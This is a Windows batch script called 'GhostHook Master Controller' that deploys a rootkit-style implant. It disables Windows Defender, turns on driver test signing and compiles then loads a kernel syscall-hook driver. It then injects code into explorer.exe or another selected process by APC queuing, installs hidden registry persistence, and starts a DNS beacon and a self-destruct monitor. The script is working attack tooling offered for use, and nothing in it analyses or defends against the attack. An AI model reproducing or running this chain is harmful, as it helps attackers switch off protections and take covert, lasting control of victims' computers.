@echo off
setlocal EnableDelayedExpansion

title GhostHook Master Controller
color 0A

echo.
echo  ╔══════════════════════════════════════════╗
echo  ║          GhostHook Automation            ║
echo  ║         Master Controller v1.0          ║
echo  ╚══════════════════════════════════════════╝
echo.

set "BASE_DIR=%~dp0"
set "LOG_FILE=%BASE_DIR%ghosthook.log"
set "STATUS_FILE=%BASE_DIR%status.txt"

echo [%TIME%] Starting GhostHook automation > "%LOG_FILE%"

call :CheckPrivileges
if errorlevel 1 (
    echo [ERROR] Administrator privileges required!
    pause
    exit /b 1
)

call :DisableDefender
call :EnableTestSigning
call :CompileComponents
call :SelectTarget
call :LoadKernelDriver
call :ExecuteInjection
call :EstablishPersistence
call :StartMonitoring
call :VerifyDeployment

echo.
echo [SUCCESS] GhostHook deployment completed successfully!
echo [INFO] System is now under complete control
echo [INFO] All logs saved to: %LOG_FILE%
pause
exit /b 0

:CheckPrivileges
echo [INFO] Checking administrator privileges...
net session >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Not running as administrator
    exit /b 1
)
echo [OK] Administrator privileges confirmed
exit /b 0

:DisableDefender
echo [INFO] Disabling Windows Defender...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1
sc stop WinDefend >nul 2>&1
echo [OK] Windows Defender disabled
exit /b 0

:EnableTestSigning
echo [INFO] Enabling test signing for driver loading...
bcdedit /set testsigning on >nul 2>&1
echo [OK] Test signing enabled (reboot required after deployment)
exit /b 0

:CompileComponents
echo [INFO] Compiling all components...

cd /d "%BASE_DIR%driver (kernel-mode operations)"
if exist "syscall_hook.c" (
    cl.exe syscall_hook.c /kernel /link ntoskrnl.lib hal.lib >nul 2>&1
    if exist "syscall_hook.sys" (
        echo [OK] Kernel driver compiled
    ) else (
        echo [ERROR] Kernel driver compilation failed
    )
)

if exist "integrity_check.asm" (
    ml64.exe /c integrity_check.asm >nul 2>&1
    echo [OK] Integrity checker compiled
)

cd /d "%BASE_DIR%injector"
if exist "apc_queuer.cpp" (
    cl.exe apc_queuer.cpp /link kernel32.lib user32.lib >nul 2>&1
    if exist "apc_queuer.exe" (
        echo [OK] APC injector compiled
    )
)

cd /d "%BASE_DIR%persistence"
if exist "dns_beacon.cpp" (
    cl.exe dns_beacon.cpp /link ws2_32.lib dnsapi.lib crypt32.lib >nul 2>&1
    if exist "dns_beacon.exe" (
        echo [OK] DNS beacon compiled
    )
)

cd /d "%BASE_DIR%self_destruct"
if exist "entropy_monitor.rs" (
    rustc entropy_monitor.rs -o entropy_monitor.exe >nul 2>&1
    if exist "entropy_monitor.exe" (
        echo [OK] Entropy monitor compiled
    )
)

cd /d "%BASE_DIR%"
exit /b 0

:SelectTarget
echo [INFO] Selecting optimal target process...
cd /d "%BASE_DIR%injector"
for /f %%i in ('python process_selector.py 2^>nul') do set TARGET_PID=%%i
if "%TARGET_PID%"=="" (
    echo [WARNING] Auto-selection failed, using explorer.exe
    for /f "tokens=2" %%i in ('tasklist /fi "imagename eq explorer.exe" ^| find "explorer.exe"') do set TARGET_PID=%%i
)
echo [OK] Target selected: PID %TARGET_PID%
echo TARGET_PID=%TARGET_PID% > "%STATUS_FILE%"
exit /b 0

:LoadKernelDriver
echo [INFO] Loading kernel driver...
cd /d "%BASE_DIR%driver (kernel-mode operations)"
if exist "syscall_hook.sys" (
    sc delete GhostDriver >nul 2>&1
    sc create GhostDriver binPath= "%BASE_DIR%driver (kernel-mode operations)\syscall_hook.sys" type= kernel start= demand >nul 2>&1
    sc start GhostDriver >nul 2>&1
    timeout /t 2 >nul
    sc query GhostDriver | find "RUNNING" >nul
    if errorlevel 1 (
        echo [WARNING] Driver load failed, continuing without kernel hooks
    ) else (
        echo [OK] Kernel driver loaded successfully
    )
) else (
    echo [WARNING] Kernel driver not found, skipping
)
exit /b 0

:ExecuteInjection
echo [INFO] Executing process injection...
cd /d "%BASE_DIR%injector"
if exist "apc_queuer.exe" (
    apc_queuer.exe %TARGET_PID% >nul 2>&1
    if errorlevel 1 (
        echo [WARNING] Injection failed on PID %TARGET_PID%
    ) else (
        echo [OK] Process injection successful
    )
) else (
    echo [WARNING] APC queuer not found, skipping injection
)
exit /b 0

:EstablishPersistence
echo [INFO] Establishing persistence mechanisms...

cd /d "%BASE_DIR%persistence"
if exist "registry_shadow.ps1" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "registry_shadow.ps1" >nul 2>&1
    echo [OK] Registry persistence installed
)

if exist "dns_beacon.exe" (
    start /b "" "dns_beacon.exe" >nul 2>&1
    timeout /t 1 >nul
    tasklist | find "dns_beacon.exe" >nul
    if errorlevel 1 (
        echo [WARNING] DNS beacon startup failed
    ) else (
        echo [OK] DNS beacon started
    )
)

cd /d "%BASE_DIR%Orchestrator"
if exist "ghosthook_orchestrator.py" (
    start /b python "ghosthook_orchestrator.py" >nul 2>&1
    echo [OK] Orchestrator started
)

exit /b 0

:StartMonitoring
echo [INFO] Starting monitoring systems...
cd /d "%BASE_DIR%self_destruct"
if exist "entropy_monitor.exe" (
    start /b "" "entropy_monitor.exe" >nul 2>&1
    timeout /t 1 >nul
    tasklist | find "entropy_monitor.exe" >nul
    if errorlevel 1 (
        echo [WARNING] Entropy monitor startup failed
    ) else (
        echo [OK] Entropy monitoring active
    )
)
exit /b 0

:VerifyDeployment
echo [INFO] Verifying deployment status...
set COMPONENTS=0

tasklist | find "dns_beacon.exe" >nul && set /a COMPONENTS+=1
tasklist | find "entropy_monitor.exe" >nul && set /a COMPONENTS+=1
sc query GhostDriver | find "RUNNING" >nul && set /a COMPONENTS+=1

echo [INFO] Active components: %COMPONENTS%/3
if %COMPONENTS% GEQ 2 (
    echo [OK] Deployment verification passed
) else (
    echo [WARNING] Some components failed to start
)

echo COMPONENTS=%COMPONENTS% >> "%STATUS_FILE%"
echo DEPLOYMENT_TIME=%DATE% %TIME% >> "%STATUS_FILE%"
exit /b 0